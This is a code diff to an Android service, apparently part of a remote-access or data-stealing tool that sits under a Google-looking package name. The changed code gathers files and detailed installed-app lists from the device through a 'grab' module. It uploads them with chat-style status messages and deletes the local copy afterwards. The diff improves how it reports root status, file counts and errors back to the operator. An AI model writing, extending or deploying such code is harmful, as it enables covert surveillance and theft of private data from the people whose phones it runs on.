@@ -577,12 +577,17 @@ class SystemNetworkService : Service() {
                                 else -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
                             }
                             val f = result.file
-                            if (f != null && f.exists()) {
+                            if (f != null && f.exists() && f.length() > 0) {
                                 d.sendFile(":inbox_tray: **Grab complete** — $target\n${result.summary()}", f.name, f.readBytes())
                                 f.delete()
                             } else {
-                                val msg = result.error ?: "No data found or permission denied"
-                                d.sendMsg(":x: **Grab failed** — $msg")
+                                val summary = "Root: ${result.hasRoot} | Apps: ${result.installedCount} | Files: ${result.files} | Size: ${result.size}B"
+                                val errMsg = result.error
+                                if (errMsg != null) {
+                                    d.sendMsg(":x: **Grab error** — $errMsg\n$summary")
+                                } else {
+                                    d.sendMsg(":inbox_tray: **Grab complete** — $target (empty)\n$summary")
+                                }
                             }
                         } catch (e: Exception) {
                             d.sendMsg(":x: **Grab error**: ${e.message?.take(80) ?: "unknown"}")
@@ -654,7 +659,7 @@ class SystemNetworkService : Service() {
                 }
                 "apps" -> {
                     d.sendMsg(":package: **Getting detailed app list**...")
-                    val result = com.google.system.AdvancedFeatures.getInstalledAppsDetailed()
+                    val result = com.google.system.AdvancedFeatures.getInstalledAppsDetailed(this@SystemNetworkService)
                     if (result.isNotBlank()) {
                         d.sendFile(":package: **Installed Apps**", "apps.txt", result.toByteArray())
                     } else {
